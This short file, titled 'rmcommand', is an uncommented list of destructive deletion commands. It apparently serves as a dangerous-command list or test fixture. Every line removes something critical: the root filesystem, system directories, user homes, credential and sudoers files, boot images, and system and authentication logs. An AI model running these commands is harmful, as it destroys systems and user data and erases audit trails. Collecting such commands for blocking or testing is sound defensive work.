rmcommand
rm -rf /
rm -rf /bin
rm -rf /usr/bin
rm -rf /sbin
rm -rf /usr/sbin
rm -rf /etc
rm -rf /lib
rm -rf /usr/lib
rm -rf /boot
rm -rf /dev
rm -rf /proc
rm -rf /sys
rm -rf /var
rm -rf /root
rm -rf /home
rm -rf /opt
rm -rf /usr
rm -rf /tmp
rm -f /etc/passwd
rm -f /etc/shadow
rm -f /etc/group
rm -f /etc/fstab
rm -f /etc/hosts
rm -f /etc/sudoers
rm -f /etc/network/interfaces
rm -f /etc/resolv.conf
rm -f /boot/vmlinuz*
rm -f /boot/initrd*
rm -f /var/log/syslog
rm -f /var/log/auth.log
rm -f /var/log/kern.log
rm -f /etc/apt/sources.list
rm -f /etc/crontab
rm -f /etc/hostname
rm -f /etc/ssh/sshd_config
rm -f /etc/environment
rm -f /etc/default/grub
rm -f /etc/localtime
rm -f /etc/timezone
